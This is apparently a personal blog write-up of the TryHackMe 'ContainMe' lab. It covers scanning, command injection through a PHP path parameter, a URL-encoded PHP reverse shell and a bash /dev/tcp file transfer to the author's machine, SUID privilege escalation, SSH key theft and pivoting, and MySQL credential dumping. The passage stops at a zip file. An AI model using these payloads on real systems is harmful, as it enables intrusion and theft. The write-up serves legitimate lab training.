---
title: "TryHackMe: ContainMe"
author: cilgin
date: 2025-07-03 14:37:11 +0300
categories: [CyberSecurity]
tags: [CTF, TryHackMe, Medium]
pin: true
math: false
mermaid: false
image:
  path: /assets/img/2025-07-03-TryHackMe-ContainMe/main.png
---

Hi I'm making [TryHackMe | ContainMe](https://tryhackme.com/room/containme1) room.

---


```bash
export IP=10.10.84.234
```


```bash
❯ nmap -T4 -n -sC -sV -Pn -p- $IP
Starting Nmap 7.97 ( https://nmap.org ) at 2025-07-03 14:43 +0300
Nmap scan report for 10.10.84.234
Host is up (0.068s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a6:3e:80:d9:b0:98:fd:7e:09:6d:34:12:f9:15:8a:18 (RSA)
|   256 ec:5f:8a:1d:59:b3:59:2f:49:ef:fb:f4:4a:d0:1d:7a (ECDSA)
|_  256 b1:4a:22:dc:7f:60:e4:fc:08:0c:55:4f:e4:15:e0:fa (ED25519)
80/tcp   open  http          Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
2222/tcp open  EtherNetIP-1?
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
8022/tcp open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.13ppa1+obfuscated~focal (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 38:39:87:29:ec:9f:b3:b7:3d:22:ef:67:f9:70:ca:ef (RSA)
|   256 4e:9e:59:79:eb:7a:32:95:f6:17:3b:d5:12:0f:9d:9f (ECDSA)
|_  256 ce:ba:ad:71:65:a1:de:13:47:11:30:a9:bf:23:e5:a9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 712.36 seconds
```


Firstly lets try fuyzzing the webserver using `gobuster`. 



```bash
❯ gobuster dir -w common.txt -u http://$IP/ -x md,js,html,php,py,css,txt,bak -t 30 
===============================================================
Gobuster v3.7
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.84.234/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.7
[+] Extensions:              md,js,html,php,py,css,txt,bak
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10918]
/index.php            (Status: 200) [Size: 329]
/info.php             (Status: 200) [Size: 68944]
Progress: 42651 / 42651 (100.00%)
===============================================================
Finished
===============================================================
```

I used -t `30` beacuse i was geting some timeouts.

```bash
❯ curl $IP/index.php                    
<html>
<body>
	<pre>
	total 28K
drwxr-xr-x 2 root root 4.0K Jul 16  2021 .
drwxr-xr-x 3 root root 4.0K Jul 15  2021 ..
-rw-r--r-- 1 root root  11K Jul 15  2021 index.html
-rw-r--r-- 1 root root  154 Jul 16  2021 index.php
-rw-r--r-- 1 root root   20 Jul 15  2021 info.php
	<pre>

<!--  where is the path ?  -->

</body>
</html>
```

I think we can use index.php to make path traversal

```bash
❯ curl 'http://10.10.84.234/index.php?path=../../../../../../../../etc/passwd'
<html>
<body>
	<pre>
	-rw-r--r-- 1 root root 1.4K Jul 19  2021 ../../../../../../../../etc/passwd
	<pre>

<!--  where is the path ?  -->

</body>
</html>
```

We can't read the files though. But maybe we can inject one more command using `;` lets try that.

```bash
❯ curl 'http://10.10.84.234/index.php?path=../../../../../../../../etc/passwd;id'
<html>
<body>
	<pre>
	-rw-r--r-- 1 root root 1.4K Jul 19  2021 ../../../../../../../../etc/passwd
uid=33(www-data) gid=33(www-data) groups=33(www-data)
	<pre>

<!--  where is the path ?  -->

</body>
</html>
```

And as you can see we have remote code execution. We can use that vuln to get reverse shell.

Let use [Online - Reverse Shell Generator](https://www.revshells.com/) to make a php reverse shell.

```bash
curl 'http://10.10.84.234/index.php?path=../../../../../../../../etc/passwd;php%20-r%20%27%24sock%3Dfsockopen%28%2210.21.206.128%22%2C4444%29%3Bexec%28%22%2Fbin%2Fbash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27'
```

And now we got a reverse shell.
Lets upgrade the shell first:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm-256color
# 
stty raw -echo;fg
reset
```



```bash
www-data@host1:/home/mike$ ls -la /home 
total 12
drwxr-xr-x  3 root root 4096 Jul 19  2021 .
drwxr-xr-x 22 root root 4096 Jul 15  2021 ..
drwxr-xr-x  5 mike mike 4096 Jul 30  2021 mike
www-data@host1:/home/mike$ ls -la /home/mike
total 384
drwxr-xr-x 5 mike mike   4096 Jul 30  2021 .
drwxr-xr-x 3 root root   4096 Jul 19  2021 ..
lrwxrwxrwx 1 root mike      9 Jul 19  2021 .bash_history -> /dev/null
-rw-r--r-- 1 mike mike    220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 mike mike   3771 Apr  4  2018 .bashrc
drwx------ 2 mike mike   4096 Jul 30  2021 .cache
drwx------ 3 mike mike   4096 Jul 30  2021 .gnupg
-rw-r--r-- 1 mike mike    807 Apr  4  2018 .profile
drwx------ 2 mike mike   4096 Jul 19  2021 .ssh
-rwxr-xr-x 1 mike mike 358668 Jul 30  2021 1cryptupx
```

You can see there is a executable on mike's home directory.
Lets try to execute that.

```bash
www-data@host1:/home/mike$ ./1cryptupx 
░█████╗░██████╗░██╗░░░██╗██████╗░████████╗░██████╗██╗░░██╗███████╗██╗░░░░░██╗░░░░░
██╔══██╗██╔══██╗╚██╗░██╔╝██╔══██╗╚══██╔══╝██╔════╝██║░░██║██╔════╝██║░░░░░██║░░░░░
██║░░╚═╝██████╔╝░╚████╔╝░██████╔╝░░░██║░░░╚█████╗░███████║█████╗░░██║░░░░░██║░░░░░
██║░░██╗██╔══██╗░░╚██╔╝░░██╔═══╝░░░░██║░░░░╚═══██╗██╔══██║██╔══╝░░██║░░░░░██║░░░░░
╚█████╔╝██║░░██║░░░██║░░░██║░░░░░░░░██║░░░██████╔╝██║░░██║███████╗███████╗███████╗
░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝╚══════╝
```

I guess we need to reverse engineer this binary.

Lets download the binary to our machine and start reverse engineering.


```bash
# On my machine
❯ nc -lvnp 5555 > binary
Listening on 0.0.0.0 5555
Connection received on 10.10.84.234 58730

# On target
www-data@host1:/home/mike$ bash -c 'cat 1cryptupx > /dev/tcp/10.21.206.128/5555'
```


I firstly looked the strings of the binary

```bash
strings binary
$Info: This file is packed with the UPX executable packer http://upx.sf.net $
$Id: UPX 3.96 Copyright (C) 1996-2020 the UPX Team. All Rights Reserved. $
```

And it is packed with upx.

But before starting to reverse engineering maybe ı need to try some strings into binary.


This binary is not SUID even if we had reverse engineered this it would'nt mattered it anyways. I think there is probaly SUID version of this binary.

```bash
www-data@host1:/usr/share/man/zh_TW$ find / -type f -perm /4000 2>/dev/null 
/usr/share/man/zh_TW/crypt
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/at
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/gpasswd
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/bin/mount
/bin/ping
/bin/su
/bin/umount
/bin/fusermount
/bin/ping6
```
And we found the suid version of this binary lets try using it.


```bash
www-data@host1:/usr/share/man/zh_TW$ ./crypt root
░█████╗░██████╗░██╗░░░██╗██████╗░████████╗░██████╗██╗░░██╗███████╗██╗░░░░░██╗░░░░░
██╔══██╗██╔══██╗╚██╗░██╔╝██╔══██╗╚══██╔══╝██╔════╝██║░░██║██╔════╝██║░░░░░██║░░░░░
██║░░╚═╝██████╔╝░╚████╔╝░██████╔╝░░░██║░░░╚█████╗░███████║█████╗░░██║░░░░░██║░░░░░
██║░░██╗██╔══██╗░░╚██╔╝░░██╔═══╝░░░░██║░░░░╚═══██╗██╔══██║██╔══╝░░██║░░░░░██║░░░░░
╚█████╔╝██║░░██║░░░██║░░░██║░░░░░░░░██║░░░██████╔╝██║░░██║███████╗███████╗███████╗
░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝╚══════╝

Unable to decompress.
```

```bash
www-data@host1:/usr/share/man/zh_TW$ ./crypt mike
░█████╗░██████╗░██╗░░░██╗██████╗░████████╗░██████╗██╗░░██╗███████╗██╗░░░░░██╗░░░░░
██╔══██╗██╔══██╗╚██╗░██╔╝██╔══██╗╚══██╔══╝██╔════╝██║░░██║██╔════╝██║░░░░░██║░░░░░
██║░░╚═╝██████╔╝░╚████╔╝░██████╔╝░░░██║░░░╚█████╗░███████║█████╗░░██║░░░░░██║░░░░░
██║░░██╗██╔══██╗░░╚██╔╝░░██╔═══╝░░░░██║░░░░╚═══██╗██╔══██║██╔══╝░░██║░░░░░██║░░░░░
╚█████╔╝██║░░██║░░░██║░░░██║░░░░░░░░██║░░░██████╔╝██║░░██║███████╗███████╗███████╗
░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝╚══════╝

root@host1:/usr/share/man/zh_TW# 
```

And we got root by little luck.

Lets get the flag

```bash
root@host1:/root# ls -la
total 32
drwx------  6 root root 4096 Jul 19  2021 .
drwxr-xr-x 22 root root 4096 Jul 15  2021 ..
lrwxrwxrwx  1 root root    9 Jul 19  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwxr-x---  3 root root 4096 Jul 16  2021 .config
drwx------  3 root root 4096 Jul 14  2021 .gnupg
drwxr-xr-x  3 root root 4096 Jul 14  2021 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  2 root root 4096 Jul 19  2021 .ssh
```

What where is my flag.


Lets try finding it with `find`


```bash
root@host1:/root# find / -type f -name *flag*
/usr/lib/x86_64-linux-gnu/perl/5.26.1/bits/ss_flags.ph
/usr/lib/x86_64-linux-gnu/perl/5.26.1/bits/waitflags.ph
find: '/proc/sys/fs/binfmt_misc': Permission denied
/proc/sys/kernel/acpi_video_flags
/proc/sys/net/ipv4/fib_notify_on_flag_change
/proc/sys/net/ipv6/fib_notify_on_flag_change
find: '/proc/tty/driver': Permission denied
/proc/kpageflags
find: '/dev/.lxd-mounts': Permission denied
find: '/sys/kernel/tracing': Permission denied
find: '/sys/kernel/debug': Permission denied
find: '/sys/kernel/config': Permission denied
/sys/devices/pnp0/00:04/tty/ttyS0/flags
/sys/devices/platform/serial8250/tty/ttyS15/flags
/sys/devices/platform/serial8250/tty/ttyS6/flags
/sys/devices/platform/serial8250/tty/ttyS23/flags
/sys/devices/platform/serial8250/tty/ttyS13/flags
/sys/devices/platform/serial8250/tty/ttyS31/flags
/sys/devices/platform/serial8250/tty/ttyS4/flags
/sys/devices/platform/serial8250/tty/ttyS21/flags
/sys/devices/platform/serial8250/tty/ttyS11/flags
/sys/devices/platform/serial8250/tty/ttyS2/flags
/sys/devices/platform/serial8250/tty/ttyS28/flags
/sys/devices/platform/serial8250/tty/ttyS18/flags
/sys/devices/platform/serial8250/tty/ttyS9/flags
/sys/devices/platform/serial8250/tty/ttyS26/flags
/sys/devices/platform/serial8250/tty/ttyS16/flags
/sys/devices/platform/serial8250/tty/ttyS7/flags
/sys/devices/platform/serial8250/tty/ttyS24/flags
/sys/devices/platform/serial8250/tty/ttyS14/flags
/sys/devices/platform/serial8250/tty/ttyS5/flags
/sys/devices/platform/serial8250/tty/ttyS22/flags
/sys/devices/platform/serial8250/tty/ttyS12/flags
/sys/devices/platform/serial8250/tty/ttyS30/flags
/sys/devices/platform/serial8250/tty/ttyS3/flags
/sys/devices/platform/serial8250/tty/ttyS20/flags
/sys/devices/platform/serial8250/tty/ttyS10/flags
/sys/devices/platform/serial8250/tty/ttyS29/flags
/sys/devices/platform/serial8250/tty/ttyS1/flags
/sys/devices/platform/serial8250/tty/ttyS19/flags
/sys/devices/platform/serial8250/tty/ttyS27/flags
/sys/devices/platform/serial8250/tty/ttyS17/flags
/sys/devices/platform/serial8250/tty/ttyS8/flags
/sys/devices/platform/serial8250/tty/ttyS25/flags
/sys/devices/virtual/net/eth0/flags
/sys/devices/virtual/net/eth1/flags
/sys/devices/virtual/net/lo/flags
find: '/sys/fs/pstore': Permission denied
find: '/sys/fs/fuse/connections/61': Permission denied
/sys/module/zfs/parameters/zfs_flags
/sys/module/scsi_mod/parameters/default_dev_flags
```



There is no flag on this machine. I remember that there is 2 ssh ports open in that machine let get all the private ssh keys in the machine and try connecting to the ssh ports.



```bash
root@host1:/home/mike/.ssh# cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAnWmOnLHQfBxrW0W0YuCiTuuGjCMUrISE4hdDMMuZruW6nj+z
.
.
.
0/AHOf/jOfwvM4G2X0L8yjJqq/5F6NOjf9uxEusphzDcr/I1inuY3A==
-----END RSA PRIVATE KEY-----
```

And lets save that to our machine.

There is no private key for root user but we can add our ssh public key for just safety.


Now we can ssh into server.


```bash
❯ ssh root@$IP
```

We can ssh into that with root so we need to use ssh port 8022 for other target.


```bash
❯ ssh root@$IP -i mike.rsa -p 8022
root@10.10.84.234's password: 

❯ ssh mike@$IP -i mike.rsa -p 8022
mike@10.10.84.234's password: 
```

And it still asks me a password so maybe i was using wrong port maybe.

Lets check that:


```bash
root@host1:/root/.ssh# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.250.10  netmask 255.255.255.0  broadcast 192.168.250.255
        inet6 fe80::216:3eff:fe9c:ff0f  prefixlen 64  scopeid 0x20<link>
        ether 00:16:3e:9c:ff:0f  txqueuelen 1000  (Ethernet)
        RX packets 1498  bytes 105251 (105.2 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1145  bytes 145840 (145.8 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.20.2  netmask 255.255.255.0  broadcast 172.16.20.255
        inet6 fe80::216:3eff:fe46:6b29  prefixlen 64  scopeid 0x20<link>
        ether 00:16:3e:46:6b:29  txqueuelen 1000  (Ethernet)
        RX packets 32  bytes 2552 (2.5 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 28  bytes 2136 (2.1 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 531  bytes 46026 (46.0 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 531  bytes 46026 (46.0 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```


And there is 2 ethernet connection. So I should ssh in inside of machine. Ok lets try that.


```bash
root@host1:/home/mike/.ssh# ssh -i id_rsa mike@172.16.20.6
The authenticity of host '172.16.20.6 (172.16.20.6)' can't be established.
ECDSA key fingerprint is SHA256:L1BKa1sC+LgClbpAX5jJvzYALuhUDf1zEzhPc/C++/8.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '172.16.20.6' (ECDSA) to the list of known hosts.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Mon Jul 19 20:23:18 2021 from 172.16.20.2
mike@host2:~$ 
```

And we are in host2


Lets try finding suid binaries again for privilage escalation:


```bash
mike@host2:~$ find / -type f -perm /4000 2>/dev/null
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/at
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/gpasswd
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/bin/mount
/bin/ping
/bin/su
/bin/umount
/bin/fusermount
/bin/ping6
```

Nothing we can use.


Lets look at the services that are running:


```bash
mike@host2:~$ service --status-all
 [ - ]  acpid
 [ + ]  apparmor
 [ + ]  apport
 [ + ]  atd
 [ + ]  cron
 [ - ]  cryptdisks
 [ - ]  cryptdisks-early
 [ + ]  dbus
 [ + ]  ebtables
 [ - ]  hwclock.sh
 [ + ]  iscsid
 [ - ]  kmod
 [ - ]  lvm2
 [ + ]  lvm2-lvmetad
 [ + ]  lvm2-lvmpolld
 [ - ]  lxcfs
 [ - ]  lxd
 [ - ]  mdadm
 [ - ]  mdadm-waitidle
 [ + ]  mysql
 [ - ]  open-iscsi
 [ + ]  procps
 [ - ]  rsync
 [ + ]  ssh
 [ + ]  udev
 [ + ]  unattended-upgrades
```
Mysql and cron are running lets check them.

Lets firstly try to log in on mysql
```bash
mike@host2:~$ mysql --user=mike --password=*********
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 4
Server version: 5.7.34-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 
```


And just trying basic passwords loged me in.


```bash
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| accounts           |
+--------------------+
2 rows in set (0.01 sec)

mysql> use accounts;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+--------------------+
| Tables_in_accounts |
+--------------------+
| users              |
+--------------------+
1 row in set (0.00 sec)

mysql> select * from users;
+-------+---------------------+
| login | password            |
+-------+---------------------+
| root  | ****************    |
| mike  | ******************* |
+-------+---------------------+
2 rows in set (0.00 sec)
```

And we got passwords now.

Lets log in as root.


```bash
root@host2:~# ls -la
total 28
drwx------  4 root root 4096 Jul 19  2021 .
drwxr-xr-x 22 root root 4096 Jun 29  2021 ..
lrwxrwxrwx  1 root root    9 Jul 19  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwxr-xr-x  3 root root 4096 Jul 15  2021 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  2 root root 4096 Jul 15  2021 .ssh
-rw-------  1 root root  218 Jul 16  2021 mike.zip
```

And there is a zip file named mike.zip lets extract that
